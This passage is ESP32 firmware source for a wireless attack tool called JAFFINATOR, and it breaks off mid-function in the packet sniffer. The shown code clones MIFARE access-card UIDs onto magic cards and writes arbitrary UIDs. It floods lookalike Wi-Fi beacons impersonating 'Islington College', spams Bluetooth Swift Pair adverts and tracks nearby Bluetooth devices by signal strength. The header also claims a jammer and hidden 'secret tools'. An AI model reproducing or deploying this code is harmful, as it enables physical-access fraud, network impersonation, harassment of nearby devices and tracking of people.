/**
 * JAFFINATOR Multi‑Tool – COMPLETE FINAL
 *
 * - BLE Keyboard fixed (CCCD wait)
 * - Jammer works (scans then jams)
 * - Secret tools toggled on /admin (no separate /secret)
 * - All NFC features, Sniffer, Tracker, etc.
 */

#include <WiFi.h>
#include <esp_wifi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <BLEDevice.h>
#include <BLEScan.h>
#include <BLEHIDDevice.h>
#include <BLECharacteristic.h>
#include <Wire.h>
#include <Adafruit_PN532.h>
#include <SPI.h>
#include <Adafruit_GFX.h>
#include <Adafruit_ST7789.h>
#include <ctype.h>
#include <math.h>

// ── Network configuration ──────────────────────────────────────────
const char* apSSID = "JaffAP";
const char* apPass = "12345678";

// ── Hardware pin mapping ───────────────────────────────────────────
#define TFT_CS    15
#define TFT_DC    2
#define TFT_RST   4
#define TFT_MOSI  18
#define TFT_SCLK  23

// PN532 (I2C)
#define PN532_IRQ -1
#define PN532_RST -1

// ── Object instances ───────────────────────────────────────────────
Adafruit_ST7789 tft(TFT_CS, TFT_DC, TFT_MOSI, TFT_SCLK, TFT_RST);
Adafruit_PN532  nfc(PN532_IRQ, PN532_RST);
WebServer       server(80);
DNSServer       dnsServer;

// BLE HID keyboard – correctly managed
BLEServer*         pServer     = nullptr;
BLEHIDDevice*      hid         = nullptr;
BLECharacteristic* input       = nullptr;
bool               kbSubscribed = false;   // track CCCD state

// ── Tool state ─────────────────────────────────────────────────────
bool     stopFlag        = false;
bool     exitFlag        = false;
uint32_t pktCount        = 0;
uint8_t  targetMAC[6]    = {0};
int      targetChannel   = 0;
uint8_t  storedUID[7];
uint8_t  storedUIDLength = 0;
bool     featureRunning  = false;
String   currentFeature  = "";
bool     webServerStarted = false;
String   webTarget       = "";

// ── Log buffer ─────────────────────────────────────────────────────
const int MAX_LOG_LINES = 50;
String logLines[MAX_LOG_LINES];
int    logIndex = 0;
int    logCount = 0;

void addLog(const String& msg) {
  Serial.println(msg);
  logLines[logIndex] = msg;
  logIndex = (logIndex + 1) % MAX_LOG_LINES;
  if (logCount < MAX_LOG_LINES) logCount++;
}

void clearLogs() {
  for (int i = 0; i < MAX_LOG_LINES; i++) logLines[i] = "";
  logIndex = 0;
  logCount = 0;
}

String featureDataJson = "{}";

// ======================== Helper functions =========================
void drawCenteredText(int y, const char* text, uint16_t color, uint8_t size) {
  int16_t x1, y1; uint16_t w, h;
  tft.setTextSize(size);
  tft.getTextBounds(text, 0, 0, &x1, &y1, &w, &h);
  int x = (320 - w) / 2;
  tft.setCursor(x, y); tft.setTextColor(color); tft.print(text);
}

void drawSignalBar(int x, int y, int rssi, uint16_t color) {
  int bars = (rssi > -50) ? 4 : (rssi > -65) ? 3 : (rssi > -80) ? 2 : (rssi > -90) ? 1 : 0;
  tft.fillRect(x, y, 40, 12, ST77XX_BLACK);
  for (int i = 0; i < 4; i++) {
    if (i < bars) tft.fillRect(x + i * 10, y + (3 - i) * 3, 8, 3, color);
    else          tft.drawRect(x + i * 10, y + (3 - i) * 3, 8, 3, 0x4208);
  }
}

String macToString(uint8_t* mac) {
  char buf[18];
  sprintf(buf, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(buf);
}

String getSafeInput() {
  String input = "";
  while (true) {
    while (Serial.available()) {
      char c = Serial.read();
      if (c == '\n' || c == '\r') { input.trim(); return input; }
      else input += c;
    }
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    delay(10);
    if (Serial.available() && Serial.peek() == 'm') { Serial.read(); return "m"; }
  }
}

void drawMenu() {
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 6, ST77XX_GREEN);
  tft.fillRect(0, 234, 320, 6, ST77XX_GREEN);
  tft.setTextSize(4);
  drawCenteredText(70, "JAFFINATOR", ST77XX_GREEN, 4);
  tft.setTextSize(2); tft.setTextColor(0x7BEF);
  drawCenteredText(130, "wireless toolkit", 0x7BEF, 2);
  tft.setTextSize(1); tft.setTextColor(ST77XX_CYAN);
  tft.setCursor(10, 210); tft.print("AP: "); tft.print(WiFi.softAPIP());
}

// ==================== NFC Helpers ==================================
bool gen1aUnlock() {
  uint8_t cmd1[] = { 0x40 }, resp[16]; uint8_t len = sizeof(resp);
  if (!nfc.inDataExchange(cmd1, 1, resp, &len)) return false;
  uint8_t cmd2[] = { 0x43 }; len = sizeof(resp);
  return nfc.inDataExchange(cmd2, 1, resp, &len);
}
bool gen1aWriteBlock(uint8_t block, uint8_t* data16) {
  uint8_t cmd[18]; cmd[0] = 0xA0; cmd[1] = block;
  memcpy(cmd + 2, data16, 16);
  uint8_t resp[16]; uint8_t len = sizeof(resp);
  return nfc.inDataExchange(cmd, 18, resp, &len);
}
void buildBlock0(uint8_t* uid4, uint8_t* block0) {
  memset(block0, 0xFF, 16); memcpy(block0, uid4, 4);
  block0[4] = uid4[0] ^ uid4[1] ^ uid4[2] ^ uid4[3];
  block0[5] = 0x08; block0[6] = 0x04; block0[7] = 0x00;
}
bool writeMagicUID(uint8_t* targetUID, uint8_t targetLen, uint8_t* newUID4) {
  uint8_t block0[16]; buildBlock0(newUID4, block0);
  if (gen1aUnlock() && gen1aWriteBlock(0, block0)) { addLog("Write: Gen1A"); return true; }
  uint8_t keyA[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
  uint8_t keyB[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
  if (nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, 0, keyA) ||
      nfc.mifareclassic_AuthenticateBlock(targetUID, targetLen, 0, 1, keyB)) {
    if (nfc.mifareclassic_WriteDataBlock(0, block0)) { addLog("Write: Gen2"); return true; }
  }
  addLog("writeMagicUID fail"); return false;
}
bool verifyUID(uint8_t* expected, uint8_t expLen) {
  for (int a = 0; a < 4; a++) {
    delay(400);
    uint8_t uid[7]; uint8_t len = 0;
    if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 1500) &&
        len == expLen && !memcmp(uid, expected, expLen)) return true;
  }
  return false;
}

// ======================== WiFi Scan & Tracker (10s pages) ==========
void runWiFiScan() {
  stopFlag = exitFlag = false;
  String trackSSID = webTarget;
  if (trackSSID.isEmpty()) {
    featureDataJson = "{\"type\":\"scan\",\"status\":\"scanning\"}";
    addLog("WiFi Scan started");
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 36, ST77XX_GREEN);
    drawCenteredText(6, "WiFi SCAN", ST77XX_WHITE, 3);

    for (int dots = 0; dots < 5 && !stopFlag && !exitFlag; dots++) {
      tft.fillRect(0, 40, 320, 30, ST77XX_BLACK);
      tft.setCursor(10, 46); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(2);
      tft.print("Scanning"); for (int i = 0; i <= (dots % 4); i++) tft.print(".");
      for (int i = 0; i < 5 && !stopFlag && !exitFlag; i++) {
        if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
        delay(100);
      }
    }
    if (stopFlag || exitFlag) { featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK); return; }

    int total = WiFi.scanNetworks();
    addLog("Found " + String(total) + " networks");
    String json = "{\"type\":\"scan\",\"total\":" + String(total) + ",\"networks\":[";
    for (int i = 0; i < total; i++) {
      if (i > 0) json += ",";
      json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"rssi\":" + String(WiFi.RSSI(i)) +
              ",\"ch\":" + String(WiFi.channel(i)) + "}";
    }
    json += "]}";
    featureDataJson = json;

    tft.setTextSize(1);
    tft.setTextColor(ST77XX_YELLOW);
    tft.setCursor(0, 42);  tft.print("No");
    tft.setCursor(28, 42); tft.print("SSID");
    tft.setCursor(190,42); tft.print("CH");
    tft.setCursor(230,42); tft.print("dBm");
    tft.setCursor(280,42); tft.print("Sig");

    int page = 0, perPage = 5;
    int totalPages = max(1, (total + perPage - 1) / perPage);
    unsigned long lastPage = 0;
    while (!stopFlag && !exitFlag) {
      if (millis() - lastPage > 10000 || page == 0) {   // 10 seconds
        lastPage = millis();
        tft.fillRect(0, 52, 320, 170, ST77XX_BLACK);
        int y = 55;
        int start = page * perPage, end = min(start + perPage, total);
        for (int i = start; i < end; i++) {
          tft.setCursor(0, y);  tft.setTextColor(ST77XX_GREEN); tft.print(i + 1);
          String ssid = WiFi.SSID(i);
          if (ssid.length() > 18) ssid = ssid.substring(0, 18) + "..";
          tft.setCursor(28, y);  tft.setTextColor(ST77XX_WHITE); tft.print(ssid);
          tft.setCursor(190, y); tft.setTextColor(ST77XX_WHITE); tft.print(WiFi.channel(i));
          tft.setCursor(230, y); tft.setTextColor(ST77XX_WHITE); tft.print(WiFi.RSSI(i));
          drawSignalBar(280, y - 2, WiFi.RSSI(i), ST77XX_GREEN);
          y += 22;
        }
        page = (page + 1) % totalPages;
      }
      tft.fillRect(0, 220, 320, 14, ST77XX_BLACK);
      tft.setCursor(10, 222); tft.setTextColor(ST77XX_CYAN); tft.print("Page ");
      tft.print(page + 1); tft.print("/"); tft.print(totalPages);
      tft.print("   [HOME]");
      for (int i = 0; i < 10 && !stopFlag && !exitFlag; i++) {
        if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
        delay(10);
      }
    }
    featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK);
    addLog("WiFi Scan exited");
  } else {
    // Tracking mode
    featureDataJson = "{\"type\":\"signal\",\"status\":\"tracking\",\"ssid\":\"" + trackSSID + "\"}";
    addLog("Signal Tracker started for: " + trackSSID);
    tft.fillScreen(ST77XX_BLACK);
    tft.fillRect(0, 0, 320, 36, ST77XX_GREEN);
    drawCenteredText(6, "TRACKING", ST77XX_WHITE, 3);
    tft.setCursor(10, 46); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(2); tft.print("Target: ");
    tft.setTextColor(ST77XX_WHITE); tft.print(trackSSID);

    unsigned long lastRead = 0;
    while (!stopFlag && !exitFlag) {
      if (millis() - lastRead > 1000) {
        lastRead = millis();
        int n = WiFi.scanNetworks();
        int rssi = -100;
        for (int i = 0; i < n; i++)
          if (WiFi.SSID(i) == trackSSID) { rssi = WiFi.RSSI(i); break; }
        String label = rssi > -50 ? "Excellent" : rssi > -65 ? "Good" : rssi > -80 ? "Fair" : "Poor";
        tft.fillRect(0, 70, 320, 150, ST77XX_BLACK);
        tft.setCursor(10, 80); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(4); tft.printf("%d dBm", rssi);
        tft.setCursor(10, 120); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2); tft.print(label);
        drawSignalBar(200, 115, rssi, ST77XX_GREEN);
        featureDataJson = "{\"type\":\"signal\",\"ssid\":\"" + trackSSID +
                          "\",\"rssi\":" + String(rssi) + ",\"label\":\"" + label + "\"}";
        addLog("Signal: " + trackSSID + " " + String(rssi) + " dBm - " + label);
      }
      for (int i = 0; i < 10 && !stopFlag && !exitFlag; i++) {
        if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
        delay(10);
      }
    }
    featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK);
    addLog("Signal Tracker exited");
  }
}

// ======================== Beacon Spam ==============================
void runWiFiBeacon() {
  stopFlag = exitFlag = false;
  featureDataJson = "{\"type\":\"beacon\",\"status\":\"running\"}";
  addLog("Beacon Spam started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 36, ST77XX_RED);
  drawCenteredText(6, "BEACON SPAM", ST77XX_WHITE, 3);
  const char* ssids[] = {
    "Islington College","Islingt0n College","Islington Co11ege",
    "Isl1ngton College","Islington C0llege","I5lington College",
    "Isl1ngt0n College"
  };
  const int numSSIDs = sizeof(ssids) / sizeof(ssids[0]);
  unsigned long count = 0;
  while (!stopFlag && !exitFlag) {
    for (int i = 0; i < numSSIDs && !stopFlag && !exitFlag; i++) {
      uint8_t pkt[128]; int slen = strlen(ssids[i]); memset(pkt, 0, sizeof(pkt));
      pkt[0] = 0x80; pkt[1] = 0x00; memset(&pkt[4], 0xFF, 6);
      pkt[10] = 0xAA; pkt[11] = 0xBB; pkt[12] = 0xCC; pkt[13] = 0xDD; pkt[14] = 0xEE; pkt[15] = 0xE0 + i;
      memcpy(&pkt[16], &pkt[10], 6); uint64_t ts = esp_timer_get_time(); memcpy(&pkt[24], &ts, 8);
      pkt[32] = 0x64; pkt[33] = 0x00; pkt[34] = 0x11; pkt[35] = 0x04;
      int pos = 36; pkt[pos++] = 0x00; pkt[pos++] = slen; memcpy(&pkt[pos], ssids[i], slen); pos += slen;
      pkt[pos++] = 0x01; pkt[pos++] = 8; uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x24,0x30,0x48,0x6c};
      memcpy(&pkt[pos], rates, 8); pos += 8; pkt[pos++] = 0x03; pkt[pos++] = 0x01; pkt[pos++] = 1;
      esp_wifi_80211_tx(WIFI_IF_AP, pkt, pos, true); delay(1); count++;
    }
    if (count % 50 == 0) {
      tft.fillRect(0, 40, 320, 180, ST77XX_BLACK);
      tft.setCursor(80, 100); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(5); tft.print(count);
      addLog("Beacons: " + String(count));
      String json = "{\"type\":\"beacon\",\"count\":" + String(count) + ",\"ssids\":[";
      for (int i = 0; i < numSSIDs; i++) { if (i > 0) json += ","; json += "\"" + String(ssids[i]) + "\""; }
      json += "]}";
      featureDataJson = json;
    }
    for (int k = 0; k < 3 && !stopFlag && !exitFlag; k++) {
      if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
      delay(1);
    }
  }
  featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK);
  addLog("Beacon Spam stopped");
}

// ======================== BLE Spam =================================
void runBLEWindowsSpam() {
  stopFlag = exitFlag = false;
  featureDataJson = "{\"type\":\"ble_spam\",\"status\":\"starting\"}";
  addLog("BLE Spam started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 36, ST77XX_RED);
  drawCenteredText(6, "BLE WINDOWS SPAM", ST77XX_WHITE, 3);
  tft.setCursor(10, 50); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(2); tft.print("Cycles:");
  BLEDevice::init("Jaffinator_Win");
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  BLEAdvertisementData oAdv;
  uint8_t swift[19] = {0x06,0x00,0x03,0x00,0x80,'J','A','F','F','I','N','A','T','O','R',0x00,0x00,0x00,0x00};
  String manData; for (int i = 0; i < 19; i++) manData += (char)swift[i];
  oAdv.setManufacturerData(manData); oAdv.setFlags(0x06);
  pAdv->setAdvertisementData(oAdv); pAdv->setScanResponse(false);
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x20);
  pAdv->start();
  unsigned long count = 0;
  while (!stopFlag && !exitFlag) {
    for (int i = 0; i < 10 && !stopFlag && !exitFlag; i++) {
      delay(100); if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
    }
    if (stopFlag || exitFlag) break;
    count++;
    tft.fillRect(130, 44, 160, 30, ST77XX_BLACK);
    tft.setCursor(130, 50); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(3); tft.print(count);
    addLog("BLE cycles: " + String(count));
    featureDataJson = "{\"type\":\"ble_spam\",\"cycles\":" + String(count) + ",\"payload\":\"Swift Pair\"}";
  }
  pAdv->stop(); featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK);
  addLog("BLE Spam stopped");
}

// ======================== BLE Tracker ==============================
void runBLETracker() {
  stopFlag = exitFlag = false;
  featureDataJson = "{\"type\":\"ble_track\",\"status\":\"scanning\"}";
  addLog("BLE Tracker started");
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 36, ST77XX_BLUE);
  drawCenteredText(6, "BLE TRACKER", ST77XX_WHITE, 3);

  tft.setTextSize(1);
  tft.setTextColor(ST77XX_YELLOW);
  tft.setCursor(0, 42);  tft.print("Name");
  tft.setCursor(170,42); tft.print("dBm");
  tft.setCursor(220,42); tft.print("Dist");
  tft.setCursor(280,42); tft.print("Sig");

  BLEDevice::init(""); BLEScan* pScan = BLEDevice::getScan();
  pScan->setActiveScan(true); pScan->setInterval(100); pScan->setWindow(99);
  int scans = 0;
  while (!stopFlag && !exitFlag) {
    BLEScanResults* found = pScan->start(3, false); scans++;
    tft.fillRect(0, 52, 320, 168, ST77XX_BLACK);
    tft.setCursor(0, 52); tft.setTextColor(ST77XX_CYAN); tft.printf("Scan #%d  %d devs", scans, found->getCount());

    String json = "{\"type\":\"ble_track\",\"scan\":" + String(scans) + ",\"devices\":[";
    int maxDev = min((int)found->getCount(), 5);
    int y = 66;
    for (int i = 0; i < maxDev; i++) {
      BLEAdvertisedDevice d = found->getDevice(i);
      String name = d.haveName() ? d.getName() : "Unknown";
      if (name.length() > 18) name = name.substring(0, 18) + "..";
      int rssi = d.getRSSI();
      bool hasTx = d.haveTXPower();
      float dist = -1;
      String distLabel = "";
      if (hasTx) {
        int tx = d.getTXPower();
        dist = pow(10, (tx - rssi) / (10.0 * 2.0));
        distLabel = dist < 1.0 ? String(dist, 2) + "m" : String(dist, 1) + "m";
      } else {
        if (rssi > -40) distLabel = "Imm";
        else if (rssi > -70) distLabel = "Near";
        else distLabel = "Far";
      }
      tft.setCursor(0, y);  tft.setTextColor(ST77XX_WHITE); tft.print(name);
      tft.setCursor(170, y); tft.print(rssi);
      tft.setCursor(220, y); tft.print(distLabel);
      drawSignalBar(280, y - 2, rssi, rssi > -70 ? ST77XX_GREEN : ST77XX_RED);
      if (i > 0) json += ",";
      json += "{\"name\":\"" + name + "\",\"rssi\":" + String(rssi) +
              ",\"mac\":\"" + d.getAddress().toString().c_str() + "\"";
      if (hasTx) json += ",\"dist\":" + String(dist, 2);
      else json += ",\"dist\":\"" + distLabel + "\"";
      json += "}";
      y += 22;
    }
    json += "]}"; featureDataJson = json;
    addLog("BLE scan #" + String(scans) + " - " + String(found->getCount()) + " devices");
    for (int i = 0; i < 10 && !stopFlag && !exitFlag; i++) {
      if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
      delay(10);
    }
  }
  pScan->stop(); featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK);
  addLog("BLE Tracker stopped");
}

// ======================== NFC Read (card type) =====================
void runNFCRead() {
  stopFlag = exitFlag = false;
  addLog("NFC Read started"); nfc.begin(); nfc.SAMConfig();
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 36, ST77XX_RED); drawCenteredText(6, "NFC READ", ST77XX_WHITE, 3);
  uint8_t lastUID[7]; uint8_t lastLen = 0; bool cardPresent = false;
  while (!stopFlag && !exitFlag) {
    bool justRead = false; uint8_t uid[7]; uint8_t len = 0;
    if (nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &len, 200)) {
      bool sameCard = (cardPresent && len == lastLen && !memcmp(uid, lastUID, len));
      if (!sameCard) {
        memcpy(lastUID, uid, len); lastLen = len; cardPresent = true;
        memcpy(storedUID, uid, len); storedUIDLength = len;
        String uidHex; for (int i = 0; i < len; i++) {
          if (uid[i] < 0x10) uidHex += "0"; uidHex += String(uid[i], HEX);
          if (i < len - 1) uidHex += ":";
        } uidHex.toUpperCase();
        String cardType = (len == 4) ? "MIFARE Classic" : (len == 7) ? "MIFARE DESFire/NTAG" : "Unknown";
        addLog("NFC Tag: " + uidHex + " (" + cardType + ")");
        featureDataJson = "{\"type\":\"nfc\",\"uid\":\"" + uidHex + "\",\"length\":" + String(len) + ",\"type\":\"" + cardType + "\"}";
        tft.fillRect(0,40,320,180,ST77XX_BLACK);
        tft.setTextSize(2); tft.setTextColor(ST77XX_YELLOW);
        drawCenteredText(50, "TAG DETECTED", ST77XX_YELLOW, 2);
        tft.setTextSize(3); tft.setTextColor(ST77XX_WHITE);
        drawCenteredText(80, uidHex.c_str(), ST77XX_WHITE, 3);
        tft.setTextSize(1); tft.setTextColor(ST77XX_CYAN);
        drawCenteredText(115, ("Len: " + String(len) + " bytes  " + cardType).c_str(), ST77XX_CYAN, 1);
        justRead = true;
      }
    } else {
      if (cardPresent) { cardPresent = false; featureDataJson = "{\"type\":\"nfc\",\"status\":\"waiting\"}";
        tft.fillRect(0,40,320,180,ST77XX_BLACK); tft.setCursor(10,60); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(2); tft.print("Waiting for tag..."); }
    }
    if (justRead) {
      unsigned long start = millis();
      while (millis() - start < 30000 && !stopFlag && !exitFlag) {
        for (int i = 0; i < 10 && !stopFlag && !exitFlag; i++) {
          if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); } delay(10);
        }
      }
      if (!stopFlag && !exitFlag) {
        cardPresent = false; featureDataJson = "{\"type\":\"nfc\",\"status\":\"waiting\"}";
        tft.fillRect(0,40,320,180,ST77XX_BLACK); tft.setCursor(10,60); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(2); tft.print("Waiting for tag...");
      }
    } else {
      for (int i = 0; i < 3 && !stopFlag && !exitFlag; i++) {
        if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); } delay(10);
      }
    }
  }
  featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK); addLog("NFC Read exited");
}

// ======================== NFC Clone (smaller UI) ===================
void runNFCClone() {
  stopFlag = exitFlag = false; addLog("NFC Clone started"); nfc.begin(); nfc.SAMConfig();
  tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,0x780F); drawCenteredText(6, "NFC CLONE", ST77XX_WHITE, 3);
  tft.fillRect(0,40,320,20,0x1082); tft.setCursor(10,44); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("STEP 1 of 2");
  tft.fillRect(10,70,300,40,0x0841); tft.drawRect(10,70,300,40,ST77XX_YELLOW);
  tft.setCursor(20,76); tft.setTextColor(ST77XX_YELLOW); tft.setTextSize(1); tft.print("Place SOURCE card");
  tft.setCursor(20,90); tft.setTextColor(ST77XX_WHITE); tft.print("Timeout: 10s");
  tft.setCursor(10,120); tft.setTextColor(ST77XX_GREEN); tft.print("Waiting...");

  if (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, storedUID, &storedUIDLength, 10000)) {
    addLog("NFC Clone: Timeout"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "TIMEOUT!", ST77XX_WHITE, 3); delay(2000); tft.fillScreen(ST77XX_BLACK); return;
  }
  String srcHex; for (int i = 0; i < storedUIDLength; i++) {
    if (storedUID[i] < 0x10) srcHex += "0"; srcHex += String(storedUID[i], HEX); if (i < storedUIDLength - 1) srcHex += ":";
  }
  addLog("Source UID: " + srcHex);
  tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,0x780F); drawCenteredText(6, "SOURCE UID", ST77XX_WHITE, 3);
  tft.setCursor(10,50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2); tft.print(srcHex);
  tft.fillRect(0,80,320,20,0x1082); tft.setCursor(10,84); tft.setTextColor(ST77XX_CYAN); tft.print("STEP 2: Place target magic card");
  delay(3000);
  tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,0x780F); drawCenteredText(6, "WRITING...", ST77XX_WHITE, 3);
  uint8_t tUID[7]; uint8_t tLen = 0;
  if (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, tUID, &tLen, 10000)) {
    addLog("NFC Clone: No target card"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "NO TARGET", ST77XX_WHITE, 3); delay(2000); tft.fillScreen(ST77XX_BLACK); return;
  }
  if (storedUIDLength != 4) {
    addLog("NFC Clone: source UID not 4 bytes"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "UNSUPPORTED", ST77XX_WHITE, 3); delay(2500); tft.fillScreen(ST77XX_BLACK); return;
  }
  bool wrote = writeMagicUID(tUID, tLen, storedUID);
  if (wrote) {
    bool verified = verifyUID(storedUID, storedUIDLength);
    if (verified) {
      addLog("Clone SUCCESS! UID: " + srcHex); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_GREEN); drawCenteredText(6, "SUCCESS", ST77XX_WHITE, 3);
      tft.setCursor(10,50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2); tft.print("UID: "); tft.print(srcHex);
      featureDataJson = "{\"type\":\"nfc_clone\",\"status\":\"success\",\"uid\":\"" + srcHex + "\"}";
    } else {
      addLog("Clone write done but verify inconclusive"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "RECHECK", ST77XX_RED, 3);
    }
  } else {
    addLog("NFC Clone: Write failed"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "WRITE FAIL", ST77XX_RED, 3);
  }
  delay(3000); tft.fillScreen(ST77XX_BLACK);
}

// ======================== Manual UID ===============================
void runManualUIDUpdate() {
  stopFlag = exitFlag = false; addLog("Manual UID started"); nfc.begin(); nfc.SAMConfig();
  tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,0x03EF); drawCenteredText(6, "MANUAL UID", ST77XX_WHITE, 3);
  tft.fillRect(0,40,320,20,0x1082); tft.setCursor(10,44); tft.setTextColor(ST77XX_CYAN); tft.print("Type UID in Serial Monitor");
  Serial.println("\n[Manual UID] Enter UID (hex, colon/space separated):");
  Serial.print("> ");
  String input = getSafeInput();
  if (input == "m") { tft.fillScreen(ST77XX_BLACK); return; }
  if (input.isEmpty()) { addLog("Manual UID: No input"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "NO INPUT", ST77XX_WHITE, 3); delay(2000); tft.fillScreen(ST77XX_BLACK); return; }
  uint8_t newUID[7]; int uidLen = 0;
  String token = "";
  for (int i = 0; i <= input.length(); i++) {
    char c = (i < input.length()) ? input[i] : ' ';
    if (c == ' ' || c == ':') { if (token.length() > 0 && uidLen < 7) { newUID[uidLen++] = (uint8_t)strtol(token.c_str(), NULL, 16); token = ""; } }
    else token += c;
  }
  if (uidLen == 0 && token.length() >= 2) { for (int i = 0; i < token.length() && uidLen < 7; i += 2) { char hex[3] = { token[i], token[i+1], '\0' }; newUID[uidLen++] = (uint8_t)strtol(hex, NULL, 16); } }
  if (uidLen == 0) { addLog("Manual UID: Parse failed"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "INVALID", ST77XX_WHITE, 3); delay(2000); tft.fillScreen(ST77XX_BLACK); return; }
  String uidStr; for (int i = 0; i < uidLen; i++) { if (newUID[i] < 0x10) uidStr += "0"; uidStr += String(newUID[i], HEX); if (i < uidLen - 1) uidStr += ":"; }
  addLog("Manual UID to write: " + uidStr);
  tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,0x03EF); drawCenteredText(6, "WRITING...", ST77XX_WHITE, 3);
  tft.setCursor(10,50); tft.setTextColor(ST77XX_WHITE); tft.setTextSize(2); tft.print(uidStr);
  tft.setCursor(10,80); tft.print("Place target magic card");
  uint8_t tUID[7]; uint8_t tLen = 0;
  if (!nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, tUID, &tLen, 10000)) { addLog("Manual UID: Timeout"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "TIMEOUT", ST77XX_WHITE, 3); delay(2000); tft.fillScreen(ST77XX_BLACK); return; }
  if (uidLen != 4) { addLog("Manual UID: only 4-byte UIDs supported"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "UNSUPPORTED", ST77XX_WHITE, 3); delay(2500); tft.fillScreen(ST77XX_BLACK); return; }
  bool wrote = writeMagicUID(tUID, tLen, newUID);
  if (wrote) {
    bool verified = verifyUID(newUID, uidLen);
    if (verified) { addLog("Manual UID SUCCESS! UID: " + uidStr); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,0x03EF); drawCenteredText(6, "SUCCESS", ST77XX_GREEN, 3); tft.setCursor(10,50); tft.print(uidStr); featureDataJson = "{\"type\":\"manual_uid\",\"status\":\"success\",\"uid\":\"" + uidStr + "\"}"; }
    else { addLog("Manual UID write done but verify inconclusive"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "RECHECK", ST77XX_RED, 3); }
  } else { addLog("Manual UID write failed"); tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "WRITE FAIL", ST77XX_RED, 3); }
  delay(3000); tft.fillScreen(ST77XX_BLACK);
}

// ======================== Sniffer ==================================
void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) { if (type == WIFI_PKT_MGMT) pktCount++; }
void runTargetSniffer() {
  stopFlag = exitFlag = false; pktCount = 0;
  featureDataJson = "{\"type\":\"sniffer\",\"status\":\"selecting\"}";
  int idx = -1;
  if (webTarget.length() > 0) idx = webTarget.toInt() - 1;
  else {
    Serial.println("[Sniffer] Scanning networks..."); int n = WiFi.scanNetworks();
    if (n == 0) { addLog("No networks"); delay(2000); tft.fillScreen(ST77XX_BLACK); drawMenu(); return; }
    for (int i = 0; i < n && i < 10; i++) Serial.printf("%d. %-20s CH:%d MAC:%s\n", i+1, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.BSSIDstr(i).c_str());
    Serial.print("Select network (1-10): "); String choice = getSafeInput();
